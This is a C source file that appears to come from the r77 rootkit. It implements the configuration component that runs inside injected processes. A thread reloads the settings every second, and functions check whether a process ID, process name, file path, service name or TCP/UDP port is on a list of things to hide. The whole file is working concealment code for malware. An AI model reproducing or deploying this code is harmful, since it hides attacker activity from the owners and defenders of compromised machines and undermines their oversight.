#include "Config.h"
#include "r77win.h"

static HANDLE ConfigThread;
static PR77_CONFIG Configuration;

VOID InitializeConfig()
{
	// The configuration is read periodically in a background thread.
	ConfigThread = CreateThread(NULL, 0, UpdateConfigThread, NULL, 0, NULL);
}
VOID UninitializeConfig()
{
	TerminateThread(ConfigThread, 0);
}
static DWORD WINAPI UpdateConfigThread(LPVOID parameter)
{
	Configuration = LoadR77Config();

	while (TRUE)
	{
		// Interval should not be too small, because this thread is running in every injected process.
		Sleep(1000);

		PR77_CONFIG newConfiguration = LoadR77Config();

		if (CompareR77Config(Configuration, newConfiguration))
		{
			// Configuration hasn't changed.
			DeleteR77Config(newConfiguration);
		}
		else
		{
			// Store configuration only if it has changed to avoid threading errors.
			PR77_CONFIG oldConfiguration = Configuration;
			Configuration = newConfiguration;
			DeleteR77Config(oldConfiguration);
		}
	}

	return 0;
}

BOOL IsProcessIdHidden(DWORD processId)
{
	return Configuration && IntegerListContains(Configuration->HiddenProcessIds, processId);
}
BOOL IsProcessNameHidden(LPCWSTR name)
{
	return Configuration && StringListContains(Configuration->HiddenProcessNames, name);
}
BOOL IsProcessNameHiddenU(UNICODE_STRING name)
{
	PWCHAR chars = ConvertUnicodeStringToString(name);
	if (chars)
	{
		BOOL result = IsProcessNameHidden(chars);
		FREE(chars);
		return result;
	}
	else
	{
		return FALSE;
	}
}
BOOL IsPathHidden(LPCWSTR path)
{
	return Configuration && StringListContains(Configuration->HiddenPaths, path);
}
BOOL IsServiceNameHidden(LPCWSTR name)
{
	return Configuration && StringListContains(Configuration->HiddenServiceNames, name);
}
BOOL IsTcpLocalPortHidden(USHORT port)
{
	return Configuration && IntegerListContains(Configuration->HiddenTcpLocalPorts, port);
}
BOOL IsTcpRemotePortHidden(USHORT port)
{
	return Configuration && IntegerListContains(Configuration->HiddenTcpRemotePorts, port);
}
BOOL IsUdpPortHidden(USHORT port)
{
	return Configuration && IntegerListContains(Configuration->HiddenUdpPorts, port);
}